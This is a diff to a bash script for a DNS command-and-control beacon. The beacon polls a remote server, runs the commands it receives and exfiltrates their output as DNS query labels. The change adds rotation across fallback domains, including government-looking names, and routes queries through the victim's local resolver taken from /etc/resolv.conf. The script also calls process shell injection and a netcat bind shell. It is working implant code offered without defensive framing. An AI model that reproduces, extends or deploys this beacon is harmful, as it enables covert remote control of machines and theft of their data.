@@ -2,8 +2,12 @@
 # Beacon to DNS server 
 
 domain="doshcloud.com"
-chkdomain="check.doshcloud.com"
+domain1="vaticancity.org"
+domain2="maine.gov"
+chkd="check."
 dnsServer="129.21.130.212"
+localServer=$(get_dns) # local DNS server on the box
+localServer=$(echo ${localServer[1]})
 f=false
 fName=""
 output=""
@@ -11,8 +15,7 @@ frag=false
 
 # Pull down commands from server
 pull(){
-
-    cmd=$(python client.py -t T $domain)
+    cmd=$(python client.py -t T -s $localServer $1)    # rotate through domain names
     first=$(echo $cmd | awk '{print $1}')
     if [[ $first == "file" ]]; then
         f=true
@@ -27,7 +30,7 @@ pull(){
             inject ${cmdArray[1]}
         else
             output=$($cmd)
-	        return_output
+	        return_output $1
         fi
     fi
 }
@@ -43,17 +46,17 @@ return_output(){
         if [[ $size -ge 255 ]]; then    # need to frag
             frag=true
         else
-            python client.py $x.$domain 
+            python client.py -s $localServer $x.$1
         fi
         while $frag; do                 # continue fragging while size is greater equal to 255
             tmp=${x:0:255}
-            python client.py $tmp.$domain
+            python client.py -s $localServer $tmp.$1
             size=${#tmp}
             if [[ $tmp -ge 255 ]]; then
                 frag=true
             else
                 tmp=${tmp:0:$size}
-                python client.py $tmp.$domain
+                python client.py -s $localServer $tmp.$1
                 frag=false
             fi
         done
@@ -62,12 +65,34 @@ return_output(){
 
 # Check in with server show beacon is still alive
 check(){
-    cmd=$(python client.py $chkdomain)
+    nx=true
+    sendDomain=$domain
+    cmd=$(python client.py -s $localServer $chkd$domain)    # rotate through domain names
+    while $nx; do
+        if [[ $cmd == "nxdomain" ]]; then
+            cmd=$(python client.py -s $localServer $chkd$domain1)
+            if [[ $cmd == "nxdomain" ]]; then
+                cmd=$(python client.py -s $localServer $chkd$domain2)
+                if [[ $cmd == "nxdomain" ]]; then
+                    sleep 20
+                else
+                    nx=false
+                    sendDomain=$domain2
+                fi
+            else
+                nx=false
+                sendDomain=$domain1
+            fi
+        else
+            nx=false
+        fi
+    done
     if [[ $cmd == "1.1.1.1" ]]; then  # means commands are awaiting beacons
-        pull
+        pull $sendDomain
     else
         echo $cmd
     fi
+    nx=true
 }
 
 # bind shell to a port with netcat
@@ -98,6 +123,14 @@ inject(){
     ./inject_shell $pid
 }
 
+# Get the local DNS server addresses
+get_dns(){
+    servers=$(cat /etc/resolv.conf | grep "nameserver" | awk '{print $2}')
+    arr=($servers)
+    for x in "${arr[@]}"; do
+        echo $x
+    done
+}
 # Main driver for beacon
 main(){
     while true; do
